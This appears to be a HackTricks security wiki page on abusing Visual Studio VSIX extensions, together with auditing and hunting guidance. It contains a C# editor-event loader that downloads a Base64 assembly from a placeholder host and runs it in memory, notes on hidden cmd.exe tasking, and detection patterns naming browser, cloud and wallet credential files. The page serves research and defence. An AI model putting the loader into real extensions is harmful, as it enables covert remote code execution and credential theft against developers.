# Visual Studio VSIX Extension Abuse

{{#include ../banners/hacktricks-training.md}}

A Visual Studio extension can turn routine editor activity into code execution under the logged-on user's identity. A malicious VSIX, a lookalike publisher, or a compromised extension update can reach that user through normal installation channels. Installation with an administrator prompt is a consented install path, not an automatic privilege escalation.<sup>[[1]](#references)</sup>

## Execution model

Classic VSSDK extensions commonly execute inside `devenv.exe`. The newer `VisualStudio.Extensibility` model primarily runs modern .NET extensions out of process: Visual Studio brokers calls to a dedicated `Microsoft.ServiceHub.Host.Extensibility` process, isolating IDE stability but **not** sandboxing the extension from the user's Windows permissions. The exact executable name can include an architecture suffix, such as `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Trigger on ordinary editor activity

Instead of exposing only a conspicuous menu command, an extension can implement `ITextViewOpenClosedListener`. Its `TextViewOpenedAsync` callback is invoked for matching documents, while `TextViewExtensionConfiguration.AppliesTo` can restrict activation to a common type such as JSON. A real formatter or linter can still perform its advertised work while a second action runs as a side effect of opening a file.<sup>[[1]](#references)[[3]](#references)</sup>

The following reduced pattern shows the important execution points; it omits the legitimate formatter and error handling for clarity.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Event-triggered in-memory managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

This chain downloads Base64 text, decodes it to assembly bytes, loads it from a `MemoryStream` through a collectible `AssemblyLoadContext`, invokes the reflected `EntryPoint` with either no parameters or a `string[]`, awaits asynchronous entry points, and unloads the context. The second stage is not written to disk, although the VSIX and primary extension DLL remain disk artefacts. Base64 provides no authenticity or confidentiality; using HTTP also permits response replacement by an on-path attacker.<sup>[[1]](#references)</sup>

Operational variations include suppressing all exceptions so the advertised feature continues when staging fails, using `ITextViewChangedListener` to trigger after edits, or returning tasking such as `cmd|<command>` and launching a hidden `cmd.exe` with redirected streams. Code executes in the extension host and can use managed APIs, P/Invoke, files, credentials, and child processes available to that user.<sup>[[1]](#references)</sup>

### Marketplace and delivery trust abuse

A VSIX can arrive as a directly shared/phished file, from the web Marketplace, or through Visual Studio's embedded Marketplace browser. Publisher registration that mainly enforces uniqueness and a reserved-word list can permit visually suggestive publisher identities; compromising an already trusted publisher or extension is even more effective because it inherits an installed user base. Marketplace installation invokes Visual Studio Installer and temporarily places the downloaded VSIX under `%LOCALAPPDATA%\\Temp`; `payload.vsix` is also used legitimately, so the filename alone is not an indicator.<sup>[[1]](#references)</sup>

MDSec did not identify a Visual Studio URL protocol that directly installed an extension. An operator still needs the user to install/trust the VSIX, or must compromise an existing extension's distribution path. An `AllUsers` package may request elevation and install under `Program Files`, but this is normal consented installer behavior rather than an automatic route to administrator or SYSTEM.<sup>[[1]](#references)</sup>

### Static auditing at scale

VSIX packages are usually ZIP containers, so a safe marketplace-review pipeline can enumerate packages, unpack them **without loading extension code**, parse the manifests, identify executable surfaces, and decompile managed assemblies with `ilspycmd`. Prioritize extension-owned assemblies after excluding common bundled dependencies, then correlate credential-store strings with behavioral clusters such as file-read plus network-send, encode plus send, download plus execution, credential-manager plus network access, or screenshot plus send.<sup>[[1]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Also inventory native DLLs, MSBuild targets, scripts, T4 templates, and installer payloads rather than assuming every execution surface is managed code. Compare suspicious behavior with the manifest's claimed purpose; telemetry and legitimate updaters can resemble exfiltration or staging. Static-only review misses packed, obfuscated, dynamically resolved, and dormant code, and reviewing only the latest version misses malicious historical releases.<sup>[[1]](#references)</sup>

### Visual Studio hunting pivots

High-signal hunting correlates several weak indicators instead of alerting on a VSIX name alone:<sup>[[1]](#references)</sup>

- Visual Studio Installer activity shortly after a new `%LOCALAPPDATA%\\Temp\\*.vsix` file appears.
- New or changed extension DLLs followed by loads into `ServiceHub.Host.Extensibility*.exe` or, for classic extensions, `devenv.exe`.
- Outbound connections, Base64-heavy responses, or unexpected child processes from `ServiceHub.Host.Extensibility*.exe`.
- Static references to `ITextViewOpenClosedListener`/`TextViewOpenedAsync` combined with `HttpClient`, `Convert.FromBase64String`, `AssemblyLoadContext.LoadFromStream`, reflection over `EntryPoint`, or process creation.
- Hidden `cmd.exe` children with redirected standard streams, especially when the parent extension host recently collected hostname, IP, network-interface, or MAC-address data.
- Extension code that accesses browser credential databases, cloud credential files, certificate stores, Windows Credential Manager, wallet files, or developer-token caches without a clear product requirement.

## References

- [1] [MDSec - Visual Studio Extensions Revisited](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - About VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener?view=vs-extensibility)

{{#include ../banners/hacktricks-training.md}}
